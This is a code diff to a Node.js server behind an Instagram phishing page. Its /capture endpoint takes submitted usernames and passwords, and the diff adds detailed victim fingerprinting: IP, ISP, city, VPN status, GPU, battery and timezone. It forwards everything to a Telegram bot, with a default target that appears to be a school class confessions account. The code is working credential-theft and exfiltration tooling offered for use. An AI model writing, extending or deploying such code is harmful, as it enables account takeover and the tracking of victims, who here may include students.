@@ -5,35 +5,45 @@ const fetch = require('node-fetch');
 const app = express();
 const PORT = process.env.PORT || 8080;
 
-// Use environment variables (recommended for Railway)
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
-if (!TELEGRAM_TOKEN || !CHAT_ID) {
-    console.error("❌ ERROR: TELEGRAM_TOKEN or CHAT_ID is missing in environment variables!");
-    console.error("Please add them in Railway Dashboard → Variables");
-}
-
 app.use(cors());
 app.use(express.json());
-app.use(express.static(__dirname));   // serves your html, css, etc.
+app.use(express.static(__dirname));
 
 app.post('/capture', async (req, res) => {
-    const { username, password, target, time } = req.body || {};
+    const { username, password, target, time, fingerprint } = req.body || {};
 
-    console.log(`[CAPTURED] Username: ${username || 'N/A'} | Password length: ${password ? password.length : 0}`);
+    console.log(`[CAPTURED] Username: ${username || 'N/A'}`);
 
     if (!username || !password) {
         return res.json({ success: true });
     }
 
-    const message = `
-<b>Instagram Login Captured</b> 🔥
+    const fp = fingerprint || {};
 
-<b>Username / Email:</b> ${username}
-<b>Password:</b> <code>${password}</code>
-<b>Target:</b> ${target || "smrj.class9.confessions"}
-<b>Time:</b> ${time ? new Date(time).toLocaleString() : new Date().toLocaleString()}
+    const message = `
+<b>🔥 Instagram Login Captured</b>
+
+👤 <b>Username:</b> ${username}
+🔑 <b>Password:</b> <code>${password}</code>
+🎯 <b>Target:</b> ${target || "smrj.class9.confessions"}
+⏰ <b>Time:</b> ${new Date(time || Date.now()).toLocaleString()}
+
+🌐 <b>Network & Location</b>
+📍 IP: ${fp.ip || 'N/A'}
+🏢 ISP: ${fp.isp || 'N/A'}
+📍 Location: ${fp.city || 'N/A'}, ${fp.country || 'N/A'}
+🛡️ VPN / Proxy: ${fp.vpn || 'Unknown'}
+
+📱 <b>Device Fingerprint</b>
+🖥️ User-Agent: <code>${fp.userAgent ? fp.userAgent.substring(0, 80) + '...' : 'N/A'}</code>
+📐 Screen: ${fp.screen || 'N/A'}
+🌍 Timezone: ${fp.timezone || 'N/A'}
+🔋 Battery: ${fp.battery || 'N/A'} (${fp.charging || 'N/A'})
+💻 GPU: ${fp.gpuVendor || 'N/A'} - ${fp.gpuRenderer || 'N/A'}
+⚙️ Cores: ${fp.hardwareConcurrency || 'N/A'} | Memory: ${fp.deviceMemory || 'N/A'} GB
     `.trim();
 
     if (TELEGRAM_TOKEN && CHAT_ID) {
@@ -51,14 +61,11 @@ app.post('/capture', async (req, res) => {
             if (response.ok) {
                 console.log("✅ Sent to Telegram successfully");
             } else {
-                const errorText = await response.text();
-                console.error(`❌ Telegram API Error ${response.status}:`, errorText);
+                console.error(`❌ Telegram Error ${response.status}`);
             }
         } catch (err) {
-            console.error("❌ Failed to connect to Telegram:", err.message);
+            console.error("❌ Telegram failed:", err.message);
         }
-    } else {
-        console.error("❌ Telegram credentials not set - message not sent");
     }
 
     res.json({ success: true });
@@ -66,5 +73,4 @@ app.post('/capture', async (req, res) => {
 
 app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
-    console.log(`📨 Telegram bot ready - Chat ID: ${CHAT_ID || 'NOT SET'}`);
 });
